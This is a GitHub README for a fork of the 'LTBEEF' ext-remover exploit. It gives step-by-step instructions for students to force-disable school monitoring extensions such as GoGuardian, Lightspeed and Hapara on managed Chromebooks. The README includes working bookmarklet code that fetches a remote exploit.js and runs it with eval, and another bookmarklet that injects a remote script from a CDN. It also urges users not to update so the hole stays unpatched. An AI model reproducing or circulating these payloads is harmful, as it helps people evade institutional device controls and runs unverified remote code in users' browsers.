# **THIS IS A FORK OF THE ORIGINAL EXPLOIT LTBEEF, MADE BY BYPASSI AND 3kh0!**
# **ORIGINAL INSTRUCTIONS FOUND BELOW**

This is a mod of ext-remover that targets GoGuardian, a shit spyware app that has been know to let "teachers" [spy on the users](https://chicago.suntimes.com/education/2020/10/5/21497946/cps-public-schools-go-guardian-technology-privacy-remote-learning), and a few more (listed below)

## Instructions

entire right click bookmark bar and click Add page...
• set Name: to whatever you want, i recommend just naming it spam
• set URL: to 
```
javascript:fetch(`https://raw.githubusercontent.com/daud-ahn/mafuk/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
```
• Alternative, copy  the code from gui.js and use that as the URL
• click Save

2. Using

• spam click the bookmark you just made
• do not stop until you get the message
```
Web Store
Go Guardians ass has been blasted
```
or similar

3. That's it 

## Currently Blocks

GoGuardian, Dyknow, Lanschool, Lightspeed Filter, Hapara, Netsupport, and Mythware

Send me the name and extension ID and I'll add it to the list!


- - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# ext remover

![image](https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png)

Bookmarklet exploit that can force-disable any extension installed on Google Chrome. Also known as LTBEEF.

**DO NOT UPDATE YOUR CHROMEBOOK! This exploit might have been patched, so do not update!**

## Instructions

Here are the instructions to using this exploit! There are two ways, using the GUI and using the ids, the GUI method is better

### Ingot (GUI)

Credit to Nebelung for this, [link to the github](https://github.com/FogNetwork/Ingot)

For easy setup go the the website at https://fognetwork.github.io/Ingot

1. Show your bookmarks bar with `ctrl + shift + b`
2. Right click on the bar and choose `Add Page`
3. Set the name to `Ingot` and the URL to the code below or [here](https://github.com/FogNetwork/Ingot/blob/main/bookmarklet.js)

```js
javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
```

![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)

### Using the GUI

Credit to CompactCow#4717 for the amazing UI!

1. Go to the file [`gui.js`](https://github.com/3kh0/ext-remover/blob/main/gui.js) and copy everything and create a new bookmark by right clicking on your bookmarks bar and selecting add page
2. Paste the code in the field that says URL and name it whatever.
3. Visit https://chrome.google.com/webstorex. (This is a 404 page, and that is ok.)
4. Click the bookmark (Make sure you are on the page above!)
5. Use the menu to toggle your extensions!

**If this helped please give me a star!**

![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)

### Using IDs

#### Disabling 

1. Visit chrome://extensions and on the extension you want to disable click on Details
2. Copy the text in the URL after the `?id=`
> For example if you have this URL: `chrome://extensions/?id=echoontop` you would only copy `echoontop`
3.  Go to the file [`bookmark.js`](https://github.com/3kh0/ext-remover/blob/main/bookmark.js) and copy everything and create a new bookmark and use the code you copied as the Page URL
4. Visit https://chrome.google.com/webstorex. (This is a 404 page, and that is ok.)
5. Click the bookmark (Make sure you are on the page above!)
6.  Put the ID you copied into the text box.

You're done! The extension should now be disabled.

**If this helped please give me a star!**

#### Enabling

1. Visit chrome://extensions and on the extension you want to enable click on Details
2. Click View in Chrome Web Store
3. You will see a banner at the top of the page that says This item has been disabled in Chrome. Enable this item
4. Click on Enable this item

You're done! The extension should now be enabled.

**If this helped please give me a star!**

Credit bypassi for finding and making this exploit!
